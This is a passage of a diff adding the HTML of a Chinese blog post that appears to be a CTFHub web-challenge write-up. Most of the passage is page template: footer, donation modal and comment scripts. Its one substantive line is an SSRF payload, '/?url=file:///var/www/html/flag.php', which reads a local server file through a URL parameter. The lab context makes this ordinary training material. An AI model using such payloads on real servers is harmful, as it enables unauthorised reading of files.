+<p><strong>&#x2F;?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</strong></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://example.com/2022/05/16/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web%E9%83%A8%E5%88%86%20-%20%E5%89%AF%E6%9C%AC/" title="" target="_blank" rel="external">http://example.com/2022/05/16/ctfhub技能树web部分 - 副本/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/wospan" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/wospan" target="_blank"><span class="text-dark">宇</span><small class="ml-1x">宇的blog</small></a></h3>
+        <div>保安日记</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2022/05/16/ctfhub%E6%8A%80%E8%83%BD%E4%B9%A6misc%E6%9D%82%E9%A1%B9%20-%20%E5%89%AF%E6%9C%AC/" title="(no title)"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2022/05/16/php%E7%9A%84%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0%20-%20%E5%89%AF%E6%9C%AC/" title="(no title)"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/wospan" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
